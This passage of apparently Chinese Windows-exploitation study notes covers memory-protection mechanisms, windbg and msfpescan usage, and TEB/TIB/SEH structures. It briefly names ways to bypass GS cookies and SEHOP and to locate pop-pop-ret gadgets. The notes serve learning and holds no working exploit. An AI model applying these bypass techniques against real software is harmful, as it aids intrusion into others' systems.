href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">进程资源管理器 - Sysinternals | Microsoft Learn</a></p><h2 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h2><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/vmmap">VMMap - Sysinternals | Microsoft Learn</a></p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h1 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h1><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><p>即linux下的NX,栈不可执行</p><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><p>即linux下的canary,不太相同的是GS的值最低位不是<code>\x00</code></p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p><strong>利用未被GS保护的内存模块</strong>:GS机制只有在缓冲区大小大于4字节的函数中才存在，可以寻找缓冲区大小不大于4字节的函数</p><p><strong>替换掉.data中的cookie值:</strong>cookie值存储在.data段中,如果可写就可以覆盖</p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>地址随机化,使得共享库,堆栈的地址不固定,在windows10中已默认启用</p><p>不过为啥二进制文件会有这个属性?</p><h2 id="Dynamic-Base"><a href="#Dynamic-Base" class="headerlink" title="Dynamic Base"></a>Dynamic Base</h2><p>程序编译时可通过<code>/DYNAMICBASE</code>编译选项指示程序是否利用<code>ASLR</code>的功能。</p><h2 id="High-Entropy-VA"><a href="#High-Entropy-VA" class="headerlink" title="High Entropy VA"></a>High Entropy VA</h2><p>这个保护被称为高熵64位地址空间布局随机化，一旦开启，表示此程序的地址随机化的取值空间为<code>64 bit</code>，这会导致攻击者更难去推测随机化后的地址</p><h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><p>结构化异常处理（Structured Exception Handling，简称 SEH）是一种<code>Windows</code>操作系统对错误或异常提供的处理技术。为<code>Windows</code>的程序设计者提供了程序错误或异常的处理途径，使得系统更加健壮。</p><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>为了防止攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击，在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠，立即终止异常处理函数的调用。</p><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p>即结构化异常处理保护(<code>Structured Exception Handling Overwrite Protection</code>)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</p><pre><code>1. 所有SEH结构体必须存在栈上2. 所有SEH结构体必须四字节对齐3. 所有SEH结构体中处理异常的函数必须不在栈上4. 检测整个SEH链中最后一个结构体，其next指针必须指向0xffffffff，且其异常处理函数必须是ntdll!FinalExceptionHandler5. 攻击者将SEH指针劫持到堆空间中运行shellcode。6. 有了SEHOP机制以后，由于ASLR的存在，攻击者很难将伪造的SEH链表的最后一个节点指到   ntdll!FinalExceptionHandler上所以在检测最后一个节点的时候会被SEHOP机制发现异常</code></pre><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p> 泄露栈信息并修复SEH chain</p><h2 id="Force-Integrity"><a href="#Force-Integrity" class="headerlink" title="Force Integrity"></a>Force Integrity</h2><p>这个保护被称为强制签名保护，一旦开启，表示此程序加载时需要验证其中的签名，如果签名不正确，程序将会被阻止运行。</p><h2 id="Control-Flow-Guard"><a href="#Control-Flow-Guard" class="headerlink" title="Control Flow Guard"></a>Control Flow Guard</h2><p>控制<code>Flow</code>防护 (CFG) 是一项高度优化的平台安全功能，旨在打击内存损坏漏洞。 通过严格限制应用程序可以从何处执行代码，利用漏洞（如缓冲区溢出）执行任意代码会更加困难。</p><p>这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点， 最终及时并有效的进行异常处理，避免引发相关的安全问题</p><h2 id="Return-Flow-Guard"><a href="#Return-Flow-Guard" class="headerlink" title="Return Flow Guard"></a>Return Flow Guard</h2><p>即返回地址防护(<code>Return Flow Guard</code>)，这项技术会在每个函数头部将返回地址保存到<code>fs:[rsp]</code>(<code>Thread Control Stack</code>)，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止了这些攻击方式。</p><h2 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h2><p>这个保护被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</p><h2 id="Authenticode"><a href="#Authenticode" class="headerlink" title="Authenticode"></a>Authenticode</h2><p>签名保护</p><h1 id="栈调用约定"><a href="#栈调用约定" class="headerlink" title="栈调用约定"></a>栈调用约定</h1><p>32位是栈传参</p><p>64位是<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">Microsoft x64</a></p><p>在发生函数调用的时候前4个参数通过寄存器 <code>RCX,RDX,R8,R9</code>，传递剩下的通过栈传递。函数的返回值保存在 <code>RAX</code>寄存器下。</p><ul><li>如果返回值为较大的值（结构体），那么由调用方在栈上分配空间，并将指针通过<code>RCX</code>传递给被调用函数，被调用函数通过<code>RAX</code>返回该指针</li><li>栈需要十六字节对齐，但是<code>call</code>之后会<code>push</code>八字节的返回地址，但是这样的情况下栈就没办法对齐了，因此所有的非叶子节点调用函数都需要调整栈帧为<code>16n+8</code>。</li><li>对于 <code>R8-R15</code> 寄存器，我们可以使用 <code>r8, r8d, r8w, r8b</code> 分别代表<code>r8</code>寄存器的<code>64</code>位、低<code>32</code>位、低<code>16</code>位和低<code>8</code>位</li><li>一般情况下<code>x64</code>平台中<code>RBP</code>栈指针被废弃，只作为普通的寄存器使用，所有的栈操作都通过<code>RSP</code>指针完成。</li><li>调用者负责清理栈帧，被调用者不用清理栈帧，但是有时候调用者不一定会清理栈帧。这是因为与通过 <code>PUSH</code> 和 <code>POP</code> 指令在堆栈中显式添加和移除参数的<code>x86</code> 编译器不同，<code>x64</code> 模式下，编译器会预留足够的堆栈空间，以调用最大目标函数（参数方法）所使用的任何内容。随后，在调用子函数时，它重复使用相同的堆栈区域来设置这些参数，从而实现不用调用者反复清栈的过程</li></ul><h1 id="常见dll"><a href="#常见dll" class="headerlink" title="常见dll"></a>常见dll</h1><ul><li>ntdll.dll：ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。是Windows系统从ring3到ring0的入口，位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中</li><li>kernel32.dll：kernel32.dll是非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域</li><li>KernelBase.dll：系统文件kernelbase.dll是存放在Windows系统文件夹中的重要文件，通常情况下是在安装操作系统过程中自动创建的，对于系统正常运行来说至关重要</li><li>ucrtbase.dll：在介绍ucrtbase.dll前先看一下msvcrt.dll是啥，msvcrt.dll是微软在windows操作系统中提供的C语言运行库执行文件（Microsoft Visual C Runtime Library)，其中提供了printf,malloc,strcpy等C语言库函数的具体运行实现，这个和libc.so很像。ucrtbase.dll其实就是把<code>msvcrt.dll</code>拆开了，主要的c运行时的代码放在了<code>ucrtbase.dll</code>中</li></ul><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="windbg-1"><a href="#windbg-1" class="headerlink" title="windbg"></a>windbg</h2><h3 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h3><ul><li><p><code>.sympath</code>查看当前符号路径</p></li><li><p><code>.reload</code>为当前所有加载的模块加载符号</p></li><li><p><code>dt type</code>查看符号的定义</p></li><li><p><code>dt type [address]</code>查看某处某个符号</p></li><li><code>x module!*</code>,查看模块的全部符号<ul><li>如果没有出现输出，请输入 <code>.reload /f</code> 以尝试强制加载符号。使用 !sym Noise 显示附加符号加载信息。</li></ul></li></ul><h3 id="内存查看"><a href="#内存查看" class="headerlink" title="内存查看"></a>内存查看</h3><ul><li><code>k</code>堆栈结构,只能看到栈的调用层次</li><li><code>d address</code>,查看某处的内存<ul><li><code>dd address</code>,差不多,更好看一点</li></ul></li><li><code>dps address</code>,将某处视作堆栈(真正实用的查看栈)</li><li><code>u address</code>,将某处内存视作代码查看</li></ul><h3 id="执行与断点"><a href="#执行与断点" class="headerlink" title="执行与断点"></a>执行与断点</h3><ul><li><code>g</code>开始执行<ul><li><code>gu</code>执行到当前函数结束</li></ul></li><li><code>p</code>,单步过</li><li><p><code>t</code>,单步进</p></li><li><p><code>bp address</code>,软件断点</p></li><li><code>bu address</code>,硬件断点</li><li><p><code>ba optione size address</code>设置处理器断点(通常称为数据断点), 当访问指定内存时会触发该断点。</p><ul><li>optione可以为<code>e(执行),w(写),r(读),i(i/o)</code></li><li>size可以为1,2,4,8(8只能在64位程序),当optione为e时,size必须为1</li></ul></li><li><p><code>bl</code>查看所有断点</p></li><li><code>bd idx</code>,取消某个断点</li></ul><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p><code>lm</code>列出所有模块</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><code>!teb</code>当前线程TEB结构体</p><h2 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p><code>msfpescan -f file_address option</code></p><p>option可以为</p><ul><li>-j,寻找寄存器跳转指令</li><li>-p,寻找pop-pop-ret类gadget</li></ul><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h1 id="SEH-1"><a href="#SEH-1" class="headerlink" title="SEH"></a>SEH</h1><p>在windows的利用中SEH结构体是十分重要的,而且相对较为复杂</p><p>所以专门讲一讲</p><h2 id="TEB与TIB"><a href="#TEB与TIB" class="headerlink" title="TEB与TIB"></a>TEB与TIB</h2><p>在了解SEH之前,我们先了解两个概念:TEB和TIB</p><p>TEB(Thread Environment Block.线程环境块),系统在此TEB中保存频繁使用的线程相关的数据。位于用户地址空间。进程中的每个线程都有自己的一个TEB。一个进程的所有TEB都以堆栈的方式，存放在线性内存空间中,每4KB为一个完整的TEB，不过该内存区域是向下扩展的。在用户模式下，当前线程的TEB位于独立的4KB段，可通过CPU的FS寄存器来访问该段，一般存储在[FS:0]。在用户态下WinDbg中可用命令$thread取得TEB地址。</p><p>这是一个TEB的组成:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB</span> &#123;</span></span><br><span class="line">  PVOID Reserved1[<span class="number">12</span>];</span><br><span class="line">  PPEB  ProcessEnvironmentBlock;</span><br><span class="line">  PVOID Reserved2[<span class="number">399</span>];</span><br><span class="line">  BYTE  Reserved3[<span class="number">1952</span>];</span><br><span class="line">  PVOID TlsSlots[<span class="number">64</span>];</span><br><span class="line">  BYTE  Reserved4[<span class="number">8</span>];</span><br><span class="line">  PVOID Reserved5[<span class="number">26</span>];</span><br><span class="line">  PVOID ReservedForOle;</span><br><span class="line">  PVOID Reserved6[<span class="number">4</span>];</span><br><span class="line">  PVOID TlsExpansionSlots;</span><br><span class="line">&#125; TEB, *PTEB;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt nt!_TEB</span><br><span class="line">ntdll!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB</span><br><span class="line">   +<span class="number">0x034</span> LastErrorValue   : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> CsrClientThread  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Win32ThreadInfo  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> WOW32Reserved    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0c4</span> CurrentLocale    : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : Uint4B</span><br><span class="line">   +<span class="number">0x0cc</span> ReservedForDebuggerInstrumentation : [<span class="number">16</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x10c</span> SystemReserved1  : [<span class="number">26</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x174</span> PlaceholderCompatibilityMode : Char</span><br><span class="line">   +<span class="number">0x175</span> PlaceholderHydrationAlwaysExplicit : UChar</span><br><span class="line">   +<span class="number">0x176</span> PlaceholderReserved : [<span class="number">10</span>] Char</span><br><span class="line">   +<span class="number">0x180</span> ProxiedProcessId : Uint4B</span><br><span class="line">   +<span class="number">0x184</span> _ActivationStack : _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x19c</span> WorkingOnBehalfTicket : [<span class="number">8</span>] UChar</span><br><span class="line">   +<span class="number">0x1a4</span> ExceptionCode    : Int4B</span><br><span class="line">   +<span class="number">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x1ac</span> InstrumentationCallbackSp : Uint4B</span><br><span class="line">   +<span class="number">0x1b0</span> InstrumentationCallbackPreviousPc : Uint4B</span><br><span class="line">   +<span class="number">0x1b4</span> InstrumentationCallbackPreviousSp : Uint4B</span><br><span class="line">   +<span class="number">0x1b8</span> InstrumentationCallbackDisabled : UChar</span><br><span class="line">   +<span class="number">0x1b9</span> SpareBytes       : [<span class="number">23</span>] UChar</span><br><span class="line">   +<span class="number">0x1d0</span> TxFsContext      : Uint4B</span><br><span class="line">   +<span class="number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x6b4</span> RealClientId     : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6c0</span> GdiClientPID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c4</span> GdiClientTID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6cc</span> Win32ClientInfo  : [<span class="number">62</span>] Uint4B</span><br><span class="line">   +<span class="number">0x7c4</span> glDispatchTable  : [<span class="number">233</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xb68</span> glReserved1      : [<span class="number">29</span>] Uint4B</span><br><span class="line">   +<span class="number">0xbdc</span> glReserved2      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe0</span> glSectionInfo    : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe4</span> glSection        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe8</span> glTable          : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbec</span> glCurrentRC      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf0</span> glContext        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf4</span> LastStatusValue  : Uint4B</span><br><span class="line">   +<span class="number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0xc00</span> StaticUnicodeBuffer : [<span class="number">261</span>] Wchar</span><br><span class="line">   +<span class="number">0xe0c</span> DeallocationStack : Ptr32 Void</span><br><span class="line">   +<span class="number">0xe10</span> TlsSlots         : [<span class="number">64</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf10</span> TlsLinks         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0xf18</span> Vdm              : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf1c</span> ReservedForNtRpc : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf20</span> DbgSsReserved    : [<span class="number">2</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf28</span> HardErrorMode    : Uint4B</span><br><span class="line">   +<span class="number">0xf2c</span> Instrumentation  : [<span class="number">9</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf50</span> ActivityId       : _GUID</span><br><span class="line">   +<span class="number">0xf60</span> SubProcessTag    : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf64</span> PerflibData      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf68</span> EtwTraceData     : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf6c</span> WinSockData      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf70</span> GdiBatchCount    : Uint4B</span><br><span class="line">   +<span class="number">0xf74</span> CurrentIdealProcessor : _PROCESSOR_NUMBER</span><br><span class="line">   +<span class="number">0xf74</span> IdealProcessorValue : Uint4B</span><br><span class="line">   +<span class="number">0xf74</span> ReservedPad0     : UChar</span><br><span class="line">   +<span class="number">0xf75</span> ReservedPad1     : UChar</span><br><span class="line">   +<span class="number">0xf76</span> ReservedPad2     : UChar</span><br><span class="line">   +<span class="number">0xf77</span> IdealProcessor   : UChar</span><br><span class="line">   +<span class="number">0xf78</span> GuaranteedStackBytes : Uint4B</span><br><span class="line">   +<span class="number">0xf7c</span> ReservedForPerf  : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf80</span> ReservedForOle   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf84</span> WaitingOnLoaderLock : Uint4B</span><br><span class="line">   +<span class="number">0xf88</span> SavedPriorityState : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf8c</span> ReservedForCodeCoverage : Uint4B</span><br><span class="line">   +<span class="number">0xf90</span> ThreadPoolData   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0xf98</span> MuiGeneration    : Uint4B</span><br><span class="line">   +<span class="number">0xf9c</span> IsImpersonating  : Uint4B</span><br><span class="line">   +<span class="number">0xfa0</span> NlsCache         : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa4</span> pShimData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa8</span> HeapData         : Uint4B</span><br><span class="line">   +<span class="number">0xfac</span> CurrentTransactionHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME</span><br><span class="line">   +<span class="number">0xfb4</span> FlsData          : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfb8</span> PreferredLanguages : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfbc</span> UserPrefLanguages : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfc0</span> MergedPrefLanguages : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfc4</span> MuiImpersonation : Uint4B</span><br><span class="line">   +<span class="number">0xfc8</span> CrossTebFlags    : Uint2B</span><br><span class="line">   +<span class="number">0xfc8</span> SpareCrossTebBits : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">   +<span class="number">0xfca</span> SameTebFlags     : Uint2B</span><br><span class="line">   +<span class="number">0xfca</span> SafeThunkCall    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> InDebugPrint     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> HasFiberData     : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SkipThreadAttach : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> WerInShipAssertCode : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> RanProcessInit   : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> ClonedThread     : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SuppressDebugMsg : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> DisableUserStackWalk : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> RtlExceptionAttached : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> InitialThread    : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SessionAware     : Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> LoadOwner        : Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> LoaderWorker     : Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SkipLoaderInit   : Pos <span class="number">14</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SpareSameTebBits : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfcc</span> TxnScopeEnterCallback : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfd0</span> TxnScopeExitCallback : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfd4</span> TxnScopeContext  : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfd8</span> LockCount        : Uint4B</span><br><span class="line">   +<span class="number">0xfdc</span> WowTebOffset     : Int4B</span><br><span class="line">   +<span class="number">0xfe0</span> ResourceRetValue : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfe4</span> ReservedForWdf   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfe8</span> ReservedForCrt   : Uint8B</span><br><span class="line">   +<span class="number">0xff0</span> EffectiveContainerId : _GUID</span><br></pre></td></tr></table></figure><p>TIB(Thread Information Block.线程信息块)，是保存线程基本信息的数据结构。是TEB的第一个成员:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Exceptionlist</span>;</span> <span class="comment">// 指向当前线程的 SEH</span></span><br><span class="line">    PVOID StackBase;    <span class="comment">// 当前线程所使用的栈的栈底</span></span><br><span class="line">    PVOID StackLimit;   <span class="comment">// 当前线程所使用的栈的栈顶</span></span><br><span class="line">    PVOID SubSystemTib; <span class="comment">// 子系统</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        ULONG Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span> <span class="comment">//指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _NT_TIB</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> StackBase        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> SubSystemTib     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> FiberData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> Version          : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Self             : Ptr32 _NT_TIB</span><br></pre></td></tr></table></figure><p>其中的<code>_EXCEPTION_REGISTRATION_RECORD *Exceptionlist</code>就是指向当前线程的SEH的指针。</p><p>那么这个<code>_EXCEPTION_REGISTRATION_RECORD</code>就是SEH的结构体,具体来说长这个样子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  Code in https://source.winehq.org/source/include/winnt.h#2623</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span> <span class="comment">// 指向下一个结构的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler; <span class="comment">// 当前异常处理回调函数的地址</span></span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : Ptr32     _EXCEPTION_DISPOSITION 